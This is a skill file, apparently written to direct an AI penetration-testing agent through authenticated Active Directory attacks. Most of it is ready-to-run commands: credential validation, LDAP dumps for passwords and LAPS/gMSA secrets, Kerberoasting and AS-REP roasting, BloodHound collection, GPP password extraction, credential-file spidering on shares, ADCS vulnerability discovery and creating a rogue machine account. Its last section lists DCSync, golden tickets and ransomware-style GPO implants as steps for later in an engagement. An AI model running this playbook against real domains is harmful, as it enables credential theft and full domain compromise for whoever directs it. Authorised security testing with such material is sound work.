---
name: windows-ad-auth
description: Authenticated AD enum and gated abuse — LDAP dump, Kerberoast, BloodHound, DNS dump, GPP/LAPS/gMSA, then specialist skills. Use when domain credentials exist in env or knowledge://auth.
metadata:
  version: '1.0'
---

# Authenticated AD enum

Requires a domain user (or computer) from project secrets or recorded knowledge. Do not echo secret values. After enum, load a specialist skill for each abuse path BloodHound or LDAP reveals.

```
DOMAIN / USER / PASS  or  USER / NT hash
DC = <dc-ip>
```

## 1. Confirm the account

```
run_nxc protocol=smb target=<dc-ip> extra_args=["-u","<user>","-p","<pass>","-d","<domain>"]
```

`[+] DOMAIN\user:pass` ⇒ valid. `(Pwn3d!)` ⇒ local admin on that host (`windows-lateral`).

## 2. LDAP user / computer dump

```
GetADUsers.py <domain>/<user>:'<pass>' -all -dc-ip <dc-ip>
nxc ldap <dc-ip> -u <user> -p '<pass>' -d <domain> --users --computers --groups
ldapsearch -x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' -b 'DC=corp,DC=local' \
  '(objectClass=user)' sAMAccountName userAccountControl servicePrincipalName description
```

Hunt **password in description**, `userPassword`, `unixUserPassword`, `ms-MCS-AdmPwd` (LAPS), `msDS-ManagedPassword` (gMSA — needs `nxc ldap --gmsa` or `gMSADumper.py`). Description passwords ⇒ finding.

## 3. Kerberoast / AS-REP (with user)

```
GetUserSPNs.py <domain>/<user>:'<pass>' -dc-ip <dc-ip> -request
GetNPUsers.py <domain>/<user>:'<pass>' -request -dc-ip <dc-ip>
nxc ldap <dc-ip> -u <user> -p '<pass>' --kerberoasting --asreproast
```

Record TGS/AS-REP hashes. Targeted Kerberoast (WriteSPN) is `windows-ldap-acl`.

## 4. BloodHound collection

```
bloodhound-python -d <domain> -u <user> -p '<pass>' -ns <dc-ip> -c All --zip
```

Store zip path as domain knowledge. Edges to chase: `DCSync`, `GenericAll/GenericWrite/WriteDACL/WriteOwner` on users/computers/gMSA/gPO, `ForceChangePassword`, `AddSelf`, `AddAllowedToAct` / RBCD, `HasSession`, `AdminTo`, `Owns`, `AllowedToDelegate`, unconstrained delegation, `AZ*` skip unless Azure.

Then load `windows-ldap-acl`, `windows-kerberos` (delegation), or `windows-adcs`.

## 5. DNS dump

```
adidnsdump -u '<domain>\<user>' -p '<pass>' --dns-ip <dc-ip> <domain>
```

New hostnames → domain knowledge + `DNS_NAME` on **existing IPs** only.

## 6. GPP / SYSVOL / policies

```
nxc smb <dc-ip> -u <user> -p '<pass>' --gpp-passwords --gpp-autologin
# Groups.xml cpassword still appears on old domains
```

Cleartext GPP ⇒ finding.

## 7. Shares and interesting files

```
nxc smb <ip> -u <user> -p '<pass>' --shares --spider SHARE --content --pattern 'pass|cred|kdbx|config'
```

## 8. ADCS recon

```
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout
```

Load `windows-adcs` if any ESC* is flagged.

## 9. MSSQL with domain creds

```
nxc mssql <ip> -u <user> -p '<pass>' -d <domain>
```

Load `windows-mssql` on hits.

## 10. MachineAccountQuota / add computer

```
# MAQ default 10 — nxc ldap --add-computer or addcomputer.py
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Passw0rd!' \
  '<domain>/<user>:<pass>' -dc-ip <dc-ip>
```

Needed for RBCD / Shadow Credentials / noPac. Record the new machine account as knowledge (not a new project target).

## 11. What not to do yet

Password spray, Responder on a shared LAN, DCSync, golden tickets, and GPO ransomware-style implants belong **after** a concrete path (ACL, relay, ADCS). Prefer proving the path with one account change you can justify (e.g. Shadow Credentials on a test user) over domain-wide impact.
